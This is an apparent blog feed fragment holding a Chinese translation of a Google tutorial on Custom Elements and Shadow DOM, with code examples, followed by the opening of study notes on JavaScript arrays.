<p>下面这个例子，在所有子元素被升级后再做了一些操作。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">share-buttons</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">social-button</span> <span class="attr">type</span>=<span class="string">"twitter"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"..."</span>&gt;</span>Twitter<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">social-button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">social-button</span> <span class="attr">type</span>=<span class="string">"fb"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"..."</span>&gt;</span>Facebook<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">social-button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">social-button</span> <span class="attr">type</span>=<span class="string">"plus"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"..."</span>&gt;</span>G+<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">social-button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">share-buttons</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">// Fetch all the children of &lt;share-buttons&gt; that are not defined yet.</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> undefinedButtons = buttons.querySelectorAll(<span class="string">':not(:defined)'</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> promises = [...undefinedButtons].map(<span class="function"><span class="params">socialButton</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> customElements.whenDefined(socialButton.localName);</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="comment">// Wait for all the social-buttons to be upgraded.</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">Promise</span>.all(promises).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">  <span class="comment">// All social-button children are ready.</span></span></span><br><span class="line"><span class="javascript">  <span class="comment">// do some thing</span></span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="元素定义"><a href="#元素定义" class="headerlink" title="元素定义"></a>元素定义</h2><p>自定义元素可以在它的内部代码中使用DOM API管理自己的内容。而元素生命周期也使得这种管理更加方便。</p>
<p>例子 - 使用默认的HTML创建一个元素</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">customElements.define(<span class="string">'x-foo-with-markup'</span>, <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">HTMLElement</span> </span>&#123;</span><br><span class="line">  connectedCallback() &#123;</span><br><span class="line">    <span class="keyword">this</span>.innerHTML = <span class="string">"&lt;b&gt;I'm an x-foo-with-markup!&lt;/b&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>网页上会呈现为</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">x-foo-with-markup</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">b</span>&gt;</span>I'm an x-foo-with-markup!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">x-foo-with-markup</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="使用Shadow-DOM创建元素"><a href="#使用Shadow-DOM创建元素" class="headerlink" title="使用Shadow DOM创建元素"></a>使用Shadow DOM创建元素</h2><p>Shadow DOM可以在页面中提供一块区域让元素有隔离的渲染和样式。你甚至可以将整个应用隐藏到一个标签中。</p>
<p>在constructor中调用this.attachShadow方法就可以使用Shadow DOM了。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Web Components<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">x-foo-shadowdom</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>User's<span class="tag">&lt;/<span class="name">b</span>&gt;</span> custom text<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">x-foo-shadowdom</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> tmpl = <span class="built_in">document</span>.createElement(<span class="string">"template"</span>);</span></span><br><span class="line">      tmpl.innerHTML = `</span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-pseudo">:host</span> &#123;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span> <span class="comment">&lt;!-- look ma, scoped styles --&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">b</span>&gt;</span>I'm in shadow dom!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span></span><br><span class="line">`;</span><br><span class="line"></span><br><span class="line">      customElements.define(</span><br><span class="line"><span class="javascript">        <span class="string">"x-foo-shadowdom"</span>,</span></span><br><span class="line"><span class="javascript">        <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">HTMLElement</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">super</span>(); <span class="comment">// always call super() first in the constructor.</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">// Attach a shadow root to the element.</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> shadowRoot = <span class="keyword">this</span>.attachShadow(&#123; <span class="attr">mode</span>: <span class="string">"open"</span> &#125;);</span></span><br><span class="line"><span class="javascript">            shadowRoot.appendChild(tmpl.content.cloneNode(<span class="literal">true</span>));</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      );</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>网页呈现结果</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">x-foo-shadowdom</span>&gt;</span></span><br><span class="line">  #shadow-root</span><br><span class="line">    <span class="tag">&lt;<span class="name">b</span>&gt;</span>I'm in shadow dom!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">slot</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span> <span class="comment">&lt;!-- slotted content appears here --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">x-foo-shadowdom</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="使用-lt-template-gt-创建元素"><a href="#使用-lt-template-gt-创建元素" class="headerlink" title="使用&lt;template&gt;创建元素"></a>使用<code>&lt;template&gt;</code>创建元素</h2><p>template可以让你很方便地声明元素的结构。</p>
<p>例子 - 使用template注册一个Shadow DOM元素</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"x-foo-from-template"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">p</span> &#123; <span class="attribute">color</span>: green; &#125;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>I'm in Shadow DOM. My markup was stamped from a <span class="symbol">&amp;lt;</span>template<span class="symbol">&amp;gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> tmpl = <span class="built_in">document</span>.querySelector(<span class="string">'#x-foo-from-template'</span>);</span></span><br><span class="line"><span class="javascript">  <span class="comment">// If your code is inside of an HTML Import you'll need to change the above line to:</span></span></span><br><span class="line"><span class="javascript">  <span class="comment">// let tmpl = document.currentScript.ownerDocument.querySelector('#x-foo-from-template');</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">  customElements.define(<span class="string">'x-foo-from-template'</span>, <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">HTMLElement</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">super</span>(); <span class="comment">// always call super() first in the constructor.</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> shadowRoot = <span class="keyword">this</span>.attachShadow(&#123;<span class="attr">mode</span>: <span class="string">'open'</span>&#125;);</span></span><br><span class="line"><span class="javascript">      shadowRoot.appendChild(tmpl.content.cloneNode(<span class="literal">true</span>));</span></span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个例子中有几个关键的知识点：</p>
<ol>
<li><p>定义了一个新标签<code>&lt;x-foo-from-template&gt;</code></p>
</li>
<li><p>使用template创建Shadow DOM</p>
</li>
<li><p>由于Shadow DOM的存在，元素DOM是内置的</p>
</li>
<li><p>由于Shadow DOM的存在，元素的CSS也是内置的，并且样式作用限定在了元素的内部</p>
</li>
</ol>
<h2 id="给自定义元素加样式"><a href="#给自定义元素加样式" class="headerlink" title="给自定义元素加样式"></a>给自定义元素加样式</h2><p>即使你的元素使用Shadow DOM限定了样式，元素的样式也会受页面样式的影响。</p>
<p>页面的样式也被称为用户定义样式（user-defined styles）。如果它和Shadow DOM有相同的样式，则用户自定义样式生效。</p>
<h2 id="给未定义的元素设置样式"><a href="#给未定义的元素设置样式" class="headerlink" title="给未定义的元素设置样式"></a>给未定义的元素设置样式</h2><p>元素未定义（升级）之前，你可以使用:not(:defined)伪类为它设置样式。</p>
<p>这种预设样式也是有用的，比如你可以让元素占有一定布局空间，即使它还没被定义。</p>
<p>下面这个例子，元素在被定义之前也占据一定空间。当然了，当元素被定义后，app-drawer:not(:defined)选择器也就失效了。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">app-drawer</span><span class="selector-pseudo">:not(</span><span class="selector-pseudo">:defined)</span> &#123;</span><br><span class="line">  <span class="comment">/* Pre-style, give layout, replicate app-drawer's eventual styles, etc. */</span></span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100vh</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="扩展元素"><a href="#扩展元素" class="headerlink" title="扩展元素"></a>扩展元素</h2><p>自定义元素API不仅对创建新的HTML元素有用的，对于扩展其他自定义元素甚至是浏览器内置元素也是有用的。</p>
<h3 id="扩展自定义元素"><a href="#扩展自定义元素" class="headerlink" title="扩展自定义元素"></a>扩展自定义元素</h3><p>拓展自定义元素使用继承它的class定义来完成。</p>
<p>例子 - 创建<code>&lt;fancy-app-drawer&gt;</code>继承自<code>&lt;app-drawer&gt;</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FancyDrawer</span> <span class="keyword">extends</span> <span class="title">AppDrawer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">super</span>(); <span class="comment">// always call super() first in the constructor. This also calls the extended class' constructor.</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  toggleDrawer() &#123;</span><br><span class="line">    <span class="comment">// Possibly different toggle implementation?</span></span><br><span class="line">    <span class="comment">// Use ES2015 if you need to call the parent method.</span></span><br><span class="line">    <span class="comment">// super.toggleDrawer()</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  anotherMethod() &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">customElements.define(<span class="string">'fancy-app-drawer'</span>, FancyDrawer);</span><br></pre></td></tr></table></figure>
<h3 id="继承原生HTML元素"><a href="#继承原生HTML元素" class="headerlink" title="继承原生HTML元素"></a>继承原生HTML元素</h3><p>假如你想创造一个功能更强大的<code>&lt;button&gt;</code>，用来替代原生<code>&lt;button&gt;</code>的功能和行为。最佳方案就是使用自定义元素去扩展已有HTML元素的功能。</p>
<p>这种继承自HTML元素的自定义元素也被称作定制内置元素（customized built-in element）。它不仅能获得原生元素的特性（属性、方法、可访问性），还能增强元素的功能。没有比使用定制内置元素去编写一个逐步增强的web应用更好的方式了。</p>
<p>注：定制内置元素不是所有浏览器都支持。</p>
<p>例子 - <code>&lt;FancyButton&gt;</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// See https://html.spec.whatwg.org/multipage/indices.html#element-interfaces</span></span><br><span class="line"><span class="comment">// for the list of other DOM interfaces.</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FancyButton</span> <span class="keyword">extends</span> <span class="title">HTMLButtonElement</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">super</span>(); <span class="comment">// always call super() first in the constructor.</span></span><br><span class="line">    <span class="keyword">this</span>.addEventListener(<span class="string">'click'</span>, e =&gt; <span class="keyword">this</span>.drawRipple(e.offsetX, e.offsetY));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Material design ripple animation.</span></span><br><span class="line">  drawRipple(x, y) &#123;</span><br><span class="line">    <span class="keyword">let</span> div = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">    div.classList.add(<span class="string">'ripple'</span>);</span><br><span class="line">    <span class="keyword">this</span>.appendChild(div);</span><br><span class="line">    div.style.top = <span class="string">`<span class="subst">$&#123;y - div.clientHeight<span class="regexp">/2&#125;px`;</span></span></span></span><br><span class="line"><span class="string"><span class="subst"><span class="regexp">    div.style.left = `$&#123;x - div.clientWidth/</span><span class="number">2</span>&#125;</span>px`</span>;</span><br><span class="line">    div.style.backgroundColor = <span class="string">'currentColor'</span>;</span><br><span class="line">    div.classList.add(<span class="string">'run'</span>);</span><br><span class="line">    div.addEventListener(<span class="string">'transitionend'</span>, e =&gt; div.remove());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">customElements.define(<span class="string">'fancy-button'</span>, FancyButton, &#123;<span class="attr">extends</span>: <span class="string">'button'</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>我们注意到这里define()需要指定继承了哪个浏览器标签。这是必要的，因为即使是不同的标签也可能继承相同的DOM接口。比如<code>&lt;q&gt;</code>、<code>&lt;blockquote&gt;</code>就都继承HTMLQuoteElement。</p>
<p>定制内置元素可以为原生标签添加is=””属性。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- This &lt;button&gt; is a fancy button. --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">is</span>=<span class="string">"fancy-button"</span> <span class="attr">disabled</span>&gt;</span>Fancy button!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="comment">// Custom elements overload createElement() to support the is="" attribute.</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">let</span> button = <span class="built_in">document</span>.createElement(<span class="string">'button'</span>, &#123;<span class="attr">is</span>: <span class="string">'fancy-button'</span>&#125;);</span></span><br><span class="line"><span class="javascript">  button.textContent = <span class="string">'Fancy button!'</span>;</span></span><br><span class="line"><span class="javascript">  button.disabled = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.body.appendChild(button);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>或者使用new操作符</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> button = <span class="keyword">new</span> FancyButton();</span><br><span class="line">button.textContent = <span class="string">'Fancy button!'</span>;</span><br><span class="line">button.disabled = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>例子 - 扩展<code>&lt;img&gt;</code></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- This &lt;img&gt; is a bigger img. --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">is</span>=<span class="string">"bigger-img"</span> <span class="attr">width</span>=<span class="string">"15"</span> <span class="attr">height</span>=<span class="string">"20"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">customElements.define(<span class="string">'bigger-img'</span>, <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">Image</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="comment">// Give img default size if users don't specify.</span></span></span><br><span class="line"><span class="javascript">  <span class="keyword">constructor</span>(width=50, height=50) &#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">super</span>(width * <span class="number">10</span>, height * <span class="number">10</span>);</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="javascript">&#125;, &#123;<span class="attr">extends</span>: <span class="string">'img'</span>&#125;);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>或者创建一个image实例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> BiggerImage = customElements.get(<span class="string">'bigger-img'</span>);</span><br><span class="line"><span class="keyword">const</span> image = <span class="keyword">new</span> BiggerImage(<span class="number">15</span>, <span class="number">20</span>); <span class="comment">// pass constructor values like so.</span></span><br><span class="line"><span class="built_in">console</span>.assert(image.width === <span class="number">150</span>);</span><br><span class="line"><span class="built_in">console</span>.assert(image.height === <span class="number">200</span>);</span><br></pre></td></tr></table></figure>
<h2 id="一些细节"><a href="#一些细节" class="headerlink" title="一些细节"></a>一些细节</h2><h3 id="未知元素vs未定义元素"><a href="#未知元素vs未定义元素" class="headerlink" title="未知元素vs未定义元素"></a>未知元素vs未定义元素</h3><p>HTML是开放、灵活的。比如你声明一个<code>&lt;randomtagthatdoesntexist&gt;</code>标签是不会抛错的。这是因为html规范允许这么做，规范中这个标签会被解析为HTMLUnknownElement。</p>
<p>所以对于自定义元素，不合法的自定义元素命名可能会被解析为HTMLElement（或HTMLUnknownElement）。</p>
<h2 id="API参考"><a href="#API参考" class="headerlink" title="API参考"></a>API参考</h2><p>全局customElements上的defines可以用来定义元素。</p>
<h3 id="define-tagName-constructor-options"><a href="#define-tagName-constructor-options" class="headerlink" title="define(tagName, constructor, options)"></a>define(tagName, constructor, options)</h3><p>例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">customElements.define(<span class="string">'my-app'</span>, <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">HTMLElement</span> </span>&#123; ... &#125;);</span><br><span class="line">customElements.define(</span><br><span class="line">  <span class="string">'fancy-button'</span>, <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">HTMLButtonElement</span> </span>&#123; ... &#125;, &#123;<span class="attr">extends</span>: <span class="string">'button'</span>&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="get-tagName"><a href="#get-tagName" class="headerlink" title="get(tagName)"></a>get(tagName)</h3><p>传入一个有效的自定义元素名称，它会返回这个元素的构造函数。如果元素没被注册则返回undefined。</p>
<p>例子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let Drawer = customElements.get(&apos;app-drawer&apos;);</span><br><span class="line">let drawer = new Drawer();</span><br></pre></td></tr></table></figure>
<h3 id="whenDefined-tagName"><a href="#whenDefined-tagName" class="headerlink" title="whenDefined(tagName)"></a>whenDefined(tagName)</h3><p>返回一个Promise，当元素被定义时会执行resolve。如果元素已经被定义，则立即执行resolve。当传入tagName是无效命名时执行reject。</p>
<p>例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">customElements.whenDefined(<span class="string">'app-drawer'</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'ready!'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="历史和浏览器支持"><a href="#历史和浏览器支持" class="headerlink" title="历史和浏览器支持"></a>历史和浏览器支持</h2><h3 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h3><p>Chrome 36+实现了v0版的自定义元素API，使用的是document.registerElement（不是customElements.define）来定义元素。v0这个版本已经弃用了。</p>
<p>目前浏览器供应商们使用的都是现在的v1版，使用customElements.define()来定义元素。</p>
<h3 id="浏览器支持"><a href="#浏览器支持" class="headerlink" title="浏览器支持"></a>浏览器支持</h3><p>Chrome 54, Safari 10.1, Firefox 63都实现了v1版，Edg也在开发中。</p>
<p>你可以使用下面代码来判断浏览器是否支持v1版。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> supportsCustomElementsV1 = <span class="string">'customElements'</span> <span class="keyword">in</span> <span class="built_in">window</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Polyfill"><a href="#Polyfill" class="headerlink" title="Polyfill"></a>Polyfill</h2><p>到浏览器广泛支持之前，v1版可以使用Polyfill。</p>
<p>我们建议使用webcomponents.js loader去实现web components polyfill的最优加载。它使用了特征检测，只有在需要的时候才会异步加载polyfill。</p>
<p>polyfill安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install --save @webcomponents/webcomponentsjs</span><br></pre></td></tr></table></figure>
<p>polyfill使用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Use the custom element on the page. --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">my-element</span>&gt;</span><span class="tag">&lt;/<span class="name">my-element</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Load polyfills; note that "loader" will load these async --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"node_modules/@webcomponents/webcomponentsjs/webcomponents-loader.js"</span> <span class="attr">defer</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Load a custom element definitions in `waitFor` and return a promise --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">src</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line">      script.src = src;</span><br><span class="line">      script.onload = resolve;</span><br><span class="line">      script.onerror = reject;</span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.head.appendChild(script);</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">  WebComponents.waitFor(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// At this point we are guaranteed that all required polyfills have</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// loaded, and can use web components APIs.</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// Next, load element definitions that call `customElements.define`.</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// Note: returning a promise causes the custom elements</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// polyfill to wait until all definitions are loaded and then upgrade</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// the document in one batch, for better performance.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> loadScript(<span class="string">'my-element.js'</span>);</span></span><br><span class="line">  &#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注：defined css伪类不能被polyfill。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>自定义元素让我们可以定义新的HTML标签，创建可复用的组件。结合其他的特性比如Shadow DOM、<code>&lt;template&gt;</code>等，我们开始逐渐意识到Web Components这个蓝图。</p>
<p>它可以：</p>
<ol>
<li><p>跨浏览器（web标准）创建和扩展可复用组件</p>
</li>
<li><p>不需要库或框架的开发（强大的JS/HTML）</p>
</li>
<li><p>熟悉的编程模型（DOM/CSS/HTML）</p>
</li>
<li><p>和其他新的web平台特性完美融合（ (Shadow DOM, <code>&lt;template&gt;</code>, CSS自定义属性等）</p>
</li>
<li><p>和浏览器DevTools的紧密集成</p>
</li>
<li><p>使用已有的可访问特性。</p>
</li>
</ol>
<h2 id="本文翻译自"><a href="#本文翻译自" class="headerlink" title="本文翻译自"></a>本文翻译自</h2><ul>
<li><a href="https://developers.google.com/web/fundamentals/web-components/customelements" target="_blank" rel="noopener">Reusable Web Components</a> By Eric Bidelman<br>Engineer @ Google working on web tooling: Headless Chrome, Puppeteer, Lighthouse</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>《数据结构与算法JavaScript描述》(笔记)</title>
    <url>/2019/03/25/%E3%80%8A%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95javascript%E6%8F%8F%E8%BF%B0%E3%80%8B/</url>
    <content><![CDATA[<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>一个存储元素的线性集合，元素可以通过索引来任意存取，索引通常是数字，用来计算元素之间存储位置的偏移量。</p>
<a id="more"></a>
<p>javascript中的数组是一种特殊的对象，用来表示偏移量的索引是该对象的属性，索引可能是整数。然而，这些数字索引在内部被转换为字符串类型，这是因为JavaScript对象中的属性名必须是字符串。数组在javascript中只是一种特殊的对象，所以效率上不如其他语言中的数组高。</p>
<p>由于Array在JavaScript中被当做对象，因此它有许多属性和方法可以在编程时使用。</p>
<h2 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h2><ol>
<li>字面量<br>最简单的方式是通过[]操作符声明一个数组变量：<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> numbers = [<span class="number">1</span>,<span class="number">2</span>];</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>通过这种方式，你将得到一个长度为2的空数组。可以通过调用内建的length属性来验证这一点：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(numbers.length); // 2</span><br></pre></td></tr></table></figure></p>
<ol start="2">
<li>构造函数</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> numbers = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>当只传一个参数，该参数用来指定数组的长度，而不是数组的第一个元素：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> numbers = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">2</span>);<span class="comment">// 创建了一个长度为2的空数组[,]</span></span><br></pre></td></tr></table></figure></p>
<p>在脚本语言里很常见的一个特性是，数组中的元素不必是同一种数据类型。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> objects = [<span class="number">1</span>, <span class="string">"1"</span>, <span class="literal">true</span>, <span class="literal">null</span>];</span><br></pre></td></tr></table></figure></p>
